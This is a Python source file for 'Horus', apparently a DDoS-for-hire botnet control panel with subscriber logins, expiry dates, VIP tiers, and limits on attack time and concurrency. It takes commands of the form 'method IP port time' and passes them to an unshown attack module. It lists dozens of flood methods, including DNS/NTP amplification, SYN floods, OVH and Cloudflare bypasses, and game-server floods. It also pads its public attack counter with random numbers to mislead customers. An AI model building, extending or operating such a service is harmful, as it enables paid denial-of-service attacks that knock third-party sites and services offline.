#!/usr/bin/env python3

import getpass, os, random,psutil, time, modules.manage_logs as manage_logs, modules.manage_users as manage_users, sys, modules.ipinfo as ipinfo, readline, modules.send_attacks as send_attacks, modules.checkhost as checkhost
from termcolor import colored
import pytz
from datetime import datetime, timedelta

username = ""
users_data = {}
FILE = "logins/logins.txt"
ACTIVE_PATH = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(ACTIVE_PATH, FILE)

admin_banner = r"""

    .s    s.                                          
    SS. .s5SSSs.  .s5SSSs.  .s    s.  .s5SSSs.  
    sS    S%S       SS.       SS.       SS.       SS. 
    SS    S%S sS    S%S sS    S%S sS    S%S sS    `:; 
    SSSs. S%S SS    S%S SS .sS;:' SS    S%S `:;;;;.   
    SS    S%S SS    S%S SS    ;,  SS    S%S       ;;. 
    SS    `:; SS    `:; SS    `:; SS    `:;       `:; 
    SS    ;,. SS    ;,. SS    ;,. SS    ;,. .,;   ;,. 
    :;    ;:' `:;;;;;:' `:    ;:' `:;;;;;:' `:;;;;;:' 
                                                    

        Admin Panel

"""

def change_title(title):
    sys.stdout.write(f"\033]0;{title}\007")

def get_IP():
    ssh_connection = os.getenv('SSH_CONNECTION', '')
    client_ip = ssh_connection.split()[0]
    return client_ip

def logs(username, ip, command):
    logs_directory = "logs"

    archivo_log = os.path.join(logs_directory, f"{username}.log")
    
    tz = pytz.timezone('Europe/Madrid')
    timestamp = datetime.now(tz).strftime('%Y-%m-%d %H:%M:%S')

    if not os.path.exists(logs_directory):
        os.makedirs(logs_directory)

    if not os.path.exists(archivo_log):
        with open(archivo_log, "w") as log_file:
            log_file.write("Timestamp | User | IP | Command\n")

    with open(archivo_log, "a") as log_file:
        log_file.write(f"{timestamp} | {username} | {ip} | {command}\n")

def logs_login(username, ip, logged):
    logs_directory = "logs"
    
    archivo_log = os.path.join(logs_directory, f"loggin_{username}.log")
    
    tz = pytz.timezone('Europe/Madrid')
    timestamp = datetime.now(tz).strftime('%Y-%m-%d %H:%M:%S')
    
    if not os.path.exists(logs_directory):
        os.makedirs(logs_directory)

    if not os.path.exists(archivo_log):
        with open(archivo_log, "w") as log_file:
            log_file.write("Timestamp | User | IP | Logged \n")

    with open(archivo_log, "a") as log_file:
        log_file.write(f"{timestamp} | {username} | {ip} | {logged}\n")

def set_user_roles(username):
    global users_data 
    with open(FILE_PATH, "r") as file:
        for line in file:
            if line.startswith(username):
                line = line.strip()
                if not line:
                    continue

                try:
                    stored_username, stored_password, expiration_date, concurrents, seconds, vip_access = line.split(":")
                    
                    users_data[username] = {
                        "stored_password": stored_password,
                        "expiration_date": expiration_date,
                        "concurrents": concurrents,
                        "seconds": seconds,
                        "vip_access": vip_access
                    }

                except Exception as e:
                    print(colored(f" [!] Error: {e}", 'red'))
                    exit(1)

def how_many_users(usuario="user"):
    users = 0
    for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
        try:
            if 'sshd' in proc.info['name'] and proc.info['username'] == usuario:
                users += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return users


def get_last_24_hours_attacks(hours=24):
    file_path = "logs/ATTACKS.log"
    if not os.path.exists(file_path):
        print(" [!] File not found.")
        return
    
    now = datetime.now()
    time_threshold = now - timedelta(hours=hours)

    attack_count = 0

    with open(file_path, "r") as file:
        next(file)
        
        for line in file:
            try:
                parts = line.split(" | ")
                log_time_str = parts[0].strip()

                if log_time_str.startswith('|'):
                    log_time_str = log_time_str[1:].strip()

                log_time = datetime.strptime(log_time_str, "%Y-%m-%d %H:%M:%S")
                
                
                if log_time >= time_threshold:
                    attack_count += 1

            except ValueError as e:
                continue
    
    attacks = random.randint(135, 366) 
    return attack_count + attacks

def show_roles(username, ip):
    print(colored(fr"""

  ▄  █ ████▄ █▄▄▄▄  ▄      ▄▄▄▄▄   
 █   █ █   █ █  ▄▀   █    █     ▀▄ 
 ██▀▀█ █   █ █▀▀▌ █   █ ▄  ▀▀▀▀▄   
 █   █ ▀████ █  █ █   █  ▀▄▄▄▄▀    
    █          █  █▄ ▄█            
   ▀          ▀    ▀▀▀                                      
                            
    Welcome {colored(username, 'red')}
    {colored("Telegram:", 'green')} {colored("t.me/HorusBotnet", 'red')}

{colored("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 'green')}
    
    {colored("Username", 'green')} {colored(username, 'red')}
    {colored("Your expiration date is on", 'green')} {colored(users_data[username]['expiration_date'], 'red',)}
    {colored("Your concurrents are", 'green')} {colored(users_data[username]['concurrents'], 'red')}
    {colored("Your max time is", 'green')} {colored(users_data[username]['seconds'], 'red')}
    {colored("Vip access", 'green')} {colored(users_data[username]['vip_access'], 'red')}

    {colored(f"Type {colored("'help'", 'red')} {colored("to show the manual", 'green')}", 'green')} 

{colored("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 'green')}
    """, 'green'))

def sprint(text, second=0.05):
    for line in text + '\n':
        sys.stdout.write(line)
        sys.stdout.flush()
        time.sleep(second)

def sprint2(text, second=0.02):
    for line in text + '\n':
        sys.stdout.write(line)
        sys.stdout.flush()
        time.sleep(second)
        
def get_username():
    return username

def clear_client_panel_screen(username, ip):
    os.system("clear")
    show_roles(username, ip)

def clear_admin_panel_screen():
    os.system("clear")
    print(colored(f"{admin_banner}", 'magenta'))

def exit_program():
     print(colored(" [+] Exiting...", 'red'))
     exit(0)

def captcha():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    os.system("clear")
    print(colored(f"{a} + {b}\n", 'green'))
    
    try:
        response = int(input())
        if response != c:
            print(colored("[!] Incorrect captcha", 'red'))
            sys.exit(1)
    except ValueError:
        print(colored("[!] Please enter a valid number", 'red'))
        sys.exit(1)
    except KeyboardInterrupt:
        print(colored("\n\n[!] Exiting..\n", 'red'))
        sys.exit(1)

def authenticate():
    login_trys = 1
    os.system("clear")
    while True:
        global username
        ip = get_IP()
        logged = False
        try:
            username = input(colored("[+] Username: ", 'blue'))
            password = getpass.getpass(colored("[+] Password: ", 'blue'))
        except KeyboardInterrupt:
            print(colored(f"\n\n [!] Exiting...\n" , 'red'))
            sys.exit(1)
        
        if login_trys <= 3:
            try:
                login_trys += 1
                with open(FILE_PATH, "r") as file:
                    for line in file:
                        line = line.strip()
                        if not line:
                            continue
                            
                        try:
                            stored_username, stored_password, expiration_date, concurrents, seconds, vip_access = line.split(":")
                        except ValueError:
                            print(colored("[!] Error", 'red'))
                            continue

                        if username == stored_username and password == stored_password:
                            logged = True
                            logs_login(username, ip, logged)
                            today = datetime.now()
                            try:
                                exp_date = datetime.strptime(expiration_date, "%d/%m/%Y")
                            except ValueError:
                                print(colored("[!] Invalid Date", 'red'))
                                sys.exit(1)
                            
                            if today <= exp_date:
                                if username == "root":
                                    admin_panel_input_command(username)
                                else:
                                    c2(username)
                                return
                            else:
                                print(colored("[!] Account expired", 'red'))
                                sys.exit(1)

                    logs_login(username, ip, logged)
                    print(colored("\n[!] Invalid username or password! Try again\n", 'red'))
                    continue
                
            except FileNotFoundError:
                print(colored("[!] Logins DB not found", 'red'))
                sys.exit(1)

            except Exception as e:
                print(colored(f"[!] Error: {e}", 'red'))
                sys.exit(1)
        else:
            print(colored("\n[!] Max tries to loggin reached!", 'red'))
            time.sleep(0.75)
            sys.exit(1)


def admin_panel_input_command(username):
    clear_admin_panel_screen()
    while True:
        try:
            command = input(colored(f" {username} >> ", 'blue')).strip()
            if command == "help":
                help_panel()
            elif command == "exit":
                exit_program()
            elif command == "users":
                users(username)
            elif command == "logs":
                managment_logs()
            elif command == "cls":
                clear_admin_panel_screen()
            elif command == "ddos":
                enter_ddos(username)
            else:
                print(colored(" [!] Unknown command", 'red'))

        except KeyboardInterrupt:
            print(colored("\n\n [+] Please use the command 'exit' to leave Horus\n", 'red'))
            continue

def users(username):
    if username == "root":
        manage_users.menu()
    else:
        print(colored(" [!] You are not root", 'red'))

def enter_ddos(username):
    c2(username)

def managment_logs():
    if username == "root":
        manage_logs.main()
    else:
        print(colored(" [!] You are not root", 'red'))

def c2(username):
    os.system("clear")
    os.system("tput civis")
    sprint(colored(f" [+] Welcome {colored(username, 'red')} {colored(f"thanks you for using our services\n [+] Starting {colored("Horus", 'red')}", 'green')}", 'green'))
    time.sleep(1)
    # bots = random.randint(10000, 15000)
    ip = get_IP()
    attacks_today = get_last_24_hours_attacks()
    active_users = how_many_users()
    change_title(f"{username} conected to horus | Active users: {active_users} | Attacks today: {attacks_today} ")
    os.system("clear")
    os.system("tput cnorm")
    set_user_roles(username)
    show_roles(username, ip)
    c2_commands(username, ip) 

def c2_commands(username, ip):
    while True:
        try:
            command = input(colored(f" {username}@horus {colored(">> ", 'red')}", 'green')).strip()
            logs(username, ip, command)
            if command == "help":
                c2_help_panel()
            elif command == "exit":
                if username == "root":
                    clear_client_panel_screen(username, ip)
                    clear_admin_panel_screen()
                    break
                else:
                    exit_program()
            elif command == "cls":
                    clear_client_panel_screen(username, ip)
            elif command == "methods":
                show_methods()
            elif command.startswith("ipinfo"):
                get_ipinfo(command)
            elif command.startswith("checkhost"):
                check_host(command)
            elif command == "attacks":
                send_attacks.view_current_attacks()
            else:
                method, victim, port, time, conc  = command.split()
                max_concurrents = users_data[username]["concurrents"]
                if validate_perms(method, victim, port, time, conc, username):
                    send_attacks.send_attack(method, victim, port, time, conc, username, ip, max_concurrents)
                else:
                    print(colored(f" [+] Insufficient perms, don'try to do that\n", 'red'))
        
        except KeyboardInterrupt:
            print(colored(f"\n\n [!] Use command 'exit' to leave Horus\n" , 'red'))
            continue

        except Exception as e:
            print(colored(f"\n [!] Unknown command or invalid attack. --> Attack Format: (method IP port time concurrent)  ex: dns 127.0.0.1 53 120 1 {e}\n", 'red'))

def get_ipinfo(command):
    try:
        arguments = command.split()
        target = arguments[1]
    except:
        print(colored(" [+] Please enter the correct format: ipinfo IP", 'red'))
    
    ipinfo.main(target)

def check_host(command):
    try:
        arguments = command.split()
        target = arguments[1]
    except:
        print(colored(" [+] Please enter the correct format: checkhost HOST", 'red'))
    
    checkhost.main(target)

def validate_perms(method, victim, port, time, conc, username):
    global users_data

    user_roles = users_data.get(username)
    if not user_roles:
        print(colored(f"\n [!] Error: User '{username}' not found.", 'red'))
        return False
    
    max_concurrents = int(user_roles["concurrents"])
    if int(conc) > max_concurrents:
        print(colored(f"\n [!] Your max concurrents are: {max_concurrents}.", 'red'))
        return False

    max_time = int(user_roles["seconds"])
    if int(time) > max_time:
        print(colored(f"\n [!] Your max time is: {max_time} seconds.", 'red'))
        return False

    return True

def main():
    captcha()
    authenticate()

def c2_help_panel():
    print(colored('''\n
    ━━━━━━━━━━━━━━━━━━━━━━[ Horus Usage ]━━━━━━━━━━━━━━━━━━━━━━

    General Commands:
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    help                      -- Shows this menu  
    exit                      -- Exit Horus.
    cls                       -- Clears the screen.
    methods                   -- Show all methods available

                    
    DDOS
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    
    Attack Format: (method IP port time concurrents) ex: bypass https://meta.com 443 120 1
                  
    attacks                    -- See running attacks

                                
    Tools:
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ipinfo                    -- Get basic public information about an IP           
    checkhost                 -- Check if the host is up or down           
    \n''', 'green'))

def help_panel():
    print(colored('''\n
 ======================[ Horus Usage ]======================

 General Commands:
 -------------------------------------------------------------------

 help                      -- Shows this menu  
 exit                      -- Exit Horus.
 users                     -- Manage Users (only for root).
 logs                      -- Manage and see the logs of Horus
 cls                       -- Clears the screen.
 ddos                      -- Enter the DDOS mode

===================================================================
    \n''', 'blue'))

def show_methods():
    methods = """
━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Amplification (AMP) Methods ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    [VIP]    DNS              → Domain Server System Amplification (High Gbit/s)
    [BASIC]  NTP              → Network Time Protocol Amplification
    [VIP]    SADP             → SADP Amplification
    [VIP]    STUN             → NAT Reflection via STUN Protocol
    [BASIC]  WSD              → Web Services on Devices Amplification (High PPS)
    [BASIC]  ARD              → Apple Remote Desktop Amplification (High PPS)
    [BASIC]  COAP             → Constrained Application Protocol Amplification (High PPS)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ UDP Methods ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    [VIP]    DISCORD          → UDP for Discord VoIP Calls
    [VIP]    UDP-PLAIN        → Randomized Low-Length UDP Flood
    [BASIC]  GMOD             → Dynamic Game GMOD Queries
    [BASIC]  TS3              → Dynamic TeamSpeak3 Queries
    [VIP]    UDP-SOURCE       → For Source Servers
    [VIP]    OPENVPN          → Emulated OpenVPN UDP Protocol

━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ TCP Methods ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    [VIP]    TFO              → SYN Flood + Fast Open Cookie
    [BASIC]  RAW-SOCKET       → Raw Socket Flood (No Data)
    [BASIC]  SYNMIX           → Mixed Flag SYN Flood (e.g., CWR)
    [BASIC]  TCP-TLS          → TLSv1.2 Data Hello Flood
    [VIP]    ACK              → ACK Flood with Custom Options
    [VIP]    OVHTCP           → Optimized Handshake Flood for OVH Firewalls
    [VIP]    RST              → SYNACK RESET Flooder
    [BASIC]  BGP              → Border Gateway Protocol TCP Amplification (High PPS)
    [VIP]    WRA              → SYN Flood with Windows OS Headers
    [BASIC]  TCP-WEB          → SYN Flood via Web Server Reflectors
    [VIP]    TCP-REFLECT      → PSH, ACK over HTTP 1.1 GET Requests
    [VIP]    TCP-MIDDLEBOX    → Amplification via Vulnerable NAT Firewalls

━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Game Methods ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    [VIP]    UDP-VSE          → TSource Valve Source Engine Flood
    [VIP]    RAKNET           → RakNet Game Queries
    [BASIC]  CS16             → Dynamic CS16 Game Queries
    [VIP]    FIVEM            → Dynamic FiveM Game Queries

━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Special Methods ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    [VIP]    SOCKETV2         → Proxied Socket Flood (No Data)
    [VIP]    SSH-SOCKET       → Proxied Socket Flood with SSH Banners
    [VIP]    HOLLOW-PURPLE    → Beta Socket-Based Flooder
    [VIP]    RAND             → Randomized L3 Protocols

━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Layer 7 Methods ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    [BASIC]  TLSV2            → HTTP2 TLS Flood
    [BASIC]  HTTP-RAW         → HIGH RPS RAW L7

    [VIP]    HTTPS            → (CF) HTTPS - HTTP/2 Flooder with IPV6
    [VIP]    BYPASS           → BYPASS - HTTP2 Flooder with IPV4
    [VIP]    TLSV3            → (CF) TLSV3 - High RPS Flooder with mixed proxy
    [VIP]    BROWSE           → Browser emulation for CF Captcha


"""
    print(colored(methods, 'green'))

if __name__ == "__main__":
    try:
        main()
    except:
        sys.exit(1)